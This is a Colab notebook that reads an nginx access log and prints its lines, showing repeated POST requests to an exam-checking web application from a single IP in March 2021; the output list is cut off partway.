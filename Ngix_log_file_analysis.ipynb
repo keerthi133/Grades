{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "name": "Ngix log file analysis.ipynb",
      "provenance": [],
      "collapsed_sections": [],
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/keerthi133/Grades/blob/master/Ngix_log_file_analysis.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "code",
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "Q7xeOvokpkSz",
        "outputId": "62a8bf20-b415-4cc4-be30-cdd338e17dfc"
      },
      "source": [
        "d=open('logfile.txt')\n",
        "#d.readlines() \n",
        "d.read().splitlines()"
      ],
      "execution_count": null,
      "outputs": [
        {
          "output_type": "execute_result",
          "data": {
            "text/plain": [
              "['103.44.12.218 - - [19/Mar/2021:14:27:44 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10380 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:44 +0000] \"GET /exam/login/?next=/exam/167/check/1/6/16/16/ HTTP/1.1\" 200 2405 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:44 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10400 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10388 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10381 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10392 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10389 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10401 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10355 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10359 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 200 10366 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"GET /exam/login/?next=/exam/164/check/1/6/16/16/ HTTP/1.1\" 200 2402 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:45 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10393 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:46 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10383 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:46 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10388 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:46 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10370 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:46 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:46 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 200 10372 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:46 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 200 10364 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:46 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:46 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 200 10351 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10363 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"POST /exam/161/check/1/6/16/16/ HTTP/1.1\" 200 10382 \"http://${BASE_URL_1}/exam/160/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 200 10372 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"GET /exam/login/?next=/exam/169/check/1/6/16/16/ HTTP/1.1\" 200 2403 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10381 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"POST /exam/173/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/172/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"GET /exam/login/?next=/exam/173/check/1/6/16/16/ HTTP/1.1\" 200 2405 \"http://${BASE_URL_1}/exam/172/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10378 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:47 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"HEAD / HTTP/1.1\" 200 0 \"-\" \"updown.io daemon 2.6\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10370 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10376 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"POST /exam/173/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/172/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"GET /exam/login/?next=/exam/173/check/1/6/16/16/ HTTP/1.1\" 200 2401 \"http://${BASE_URL_1}/exam/172/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 200 10379 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10389 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10373 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:48 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:49 +0000] \"GET /exam/login/?next=/exam/164/check/1/6/16/16/ HTTP/1.1\" 200 2405 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:49 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:49 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:50 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:50 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10404 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:50 +0000] \"GET /exam/login/?next=/exam/164/check/1/6/16/16/ HTTP/1.1\" 200 2402 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:50 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10404 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:50 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10370 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:50 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:50 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 403 562 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:50 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:52 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:52 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:53 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:54 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:54 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10356 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:54 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:54 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 200 10399 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10382 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/169/check/1/6/16/16/ HTTP/1.1\" 200 10383 \"http://${BASE_URL_1}/exam/168/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/162/check/1/6/16/16/ HTTP/1.1\" 200 10353 \"http://${BASE_URL_1}/exam/161/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10381 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 302 0 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10396 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 200 10382 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10383 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"GET /exam/login/?next=/exam/167/check/1/6/16/16/ HTTP/1.1\" 200 2406 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10387 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 200 10359 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/168/check/1/6/16/16/ HTTP/1.1\" 200 10381 \"http://${BASE_URL_1}/exam/167/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10371 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/165/check/1/6/16/16/ HTTP/1.1\" 200 10387 \"http://${BASE_URL_1}/exam/164/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 200 10372 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:55 +0000] \"POST /exam/167/check/1/6/16/16/ HTTP/1.1\" 200 10360 \"http://${BASE_URL_1}/exam/166/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:56 +0000] \"POST /exam/162/check/1/6/16/16/ HTTP/1.1\" 200 10353 \"http://${BASE_URL_1}/exam/161/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:56 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 403 761 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:56 +0000] \"POST /exam/166/check/1/6/16/16/ HTTP/1.1\" 200 10375 \"http://${BASE_URL_1}/exam/165/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:56 +0000] \"POST /exam/164/check/1/6/16/16/ HTTP/1.1\" 404 1846 \"http://${BASE_URL_1}/exam/163/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:56 +0000] \"POST /exam/163/check/1/6/16/16/ HTTP/1.1\" 200 10363 \"http://${BASE_URL_1}/exam/162/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
              " '103.44.12.218 - - [19/Mar/2021:14:27:56 +0000] \"POST /exam/170/check/1/6/16/16/ HTTP/1.1\" 200 10382 \"http://${BASE_URL_1}/exam/169/check/2/6/16/16/\" \"Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:86.0) Gecko/20100101 Firefox/86.0\"',\n",
